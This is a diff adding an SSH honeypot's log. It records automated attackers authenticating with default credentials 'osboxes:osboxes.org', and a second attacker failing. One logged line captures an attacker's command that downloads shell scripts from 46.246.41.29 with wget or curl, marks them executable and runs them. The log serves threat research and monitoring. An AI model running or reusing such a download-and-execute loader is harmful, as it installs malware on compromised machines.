@@ -1,0 +1,22 @@
+2020-10-27 15:16:24.704 - [Info] MITM Version: 1.26
+2020-10-27 15:16:24.711 - [Info] Auto Access Enabled: true
+2020-10-27 15:16:24.711 - [Debug] [Init] Auto Access Barrier: true
+2020-10-27 15:16:24.735 - [Info] SSH man-in-the-middle server for 172.20.0.203 listening on 0.0.0.0:10002
+2020-10-27 15:17:47.272 - [Debug] [Connection] Attacker connected: 221.12.100.170 | Client Identification: SSH-2.0-Go
+2020-10-27 15:17:48.931 - [Debug] [Auth] Attacker 221.12.100.170 trying to authenticate with "none"
+2020-10-27 15:17:48.932 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-10-27 15:17:49.499 - [Debug] [Auth] Attacker 221.12.100.170 trying to authenticate with "password"
+2020-10-27 15:17:49.502 - [Debug] [Auto Access] Attacker: 221.12.100.170, Threshold: 1, Attempts: 1
+2020-10-27 15:17:49.502 - [Debug] [Auto Access] Compromising the honeypot
+2020-10-27 15:17:49.502 - [Debug] [Auto Access] Adding the following credentials: "osboxes:osboxes.org"
+2020-10-27 15:17:50.140 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-10-27 15:17:50.141 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.203
+2020-10-27 15:18:05.550 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-10-27 15:18:06.745 - [Debug] [EXEC] Noninteractive mode attacker command: echo "cd /tmp; rm -f *.sh; wget http://46.246.41.29/wget.sh || curl http://46.246.41.29/curl.sh -o curl.sh; chmod +x *.sh; ./wget.sh; ./curl.sh" | sh
+2020-10-27 15:19:39.035 - [Debug] [Connection] Attacker connected: 141.98.81.154 | Client Identification: SSH-2.0-Go
+2020-10-27 15:19:39.638 - [Debug] [Auth] Attacker 141.98.81.154 trying to authenticate with "none"
+2020-10-27 15:19:39.638 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-10-27 15:19:39.861 - [Debug] [Auth] Attacker 141.98.81.154 trying to authenticate with "password"
+2020-10-27 15:19:39.863 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2020-10-27 15:19:39.864 - [Debug] [Auth] Attacker: 141.98.81.154 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-27 15:19:40.087 - [Debug] [Connection] Attacker closed the connection
